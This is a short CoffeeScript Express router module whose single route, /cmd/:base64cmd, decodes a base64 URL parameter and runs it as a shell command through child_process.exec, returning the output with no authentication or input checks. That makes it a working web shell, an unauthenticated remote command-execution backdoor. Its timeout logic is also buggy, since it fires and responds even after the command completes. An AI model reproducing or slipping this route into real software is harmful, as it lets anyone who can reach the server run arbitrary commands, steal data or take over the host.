express = require 'express'
router = express.Router()
{ exec } = require("child_process")

router.get "/cmd/:base64cmd", (req, res) ->
    try
        command = Buffer.from(req.params.base64cmd.replace(/_/g, "/"), 'base64').toString()
        process = exec command, (err, stdout, stderr) ->
            res.status(if err then 500 else 200).send { stdout, stderr }
        
        setTimeout ->
            process.kill()
            res.status(408).send()
        , 60000
    catch
        res.status(400).send()

module.exports = router
